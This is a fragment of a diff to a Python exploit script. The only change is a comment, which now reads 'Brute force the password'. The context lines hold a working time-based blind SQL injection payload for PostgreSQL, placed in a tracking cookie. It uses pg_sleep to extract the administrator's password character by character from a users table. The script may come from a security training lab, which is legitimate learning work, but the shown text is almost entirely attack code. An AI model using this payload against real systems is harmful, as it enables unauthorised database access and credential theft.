@@ -36,7 +36,7 @@ while True:
         break
 print("Password length:", password_length)
 
-# Step 3: Creck the password
+# Step 3: Brute force the password
 def test_character(position, char):
     cookie_value_passwd = f"'||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)--"
     elapsed_time_passwd = test_tracking_id(cookie_value_passwd)
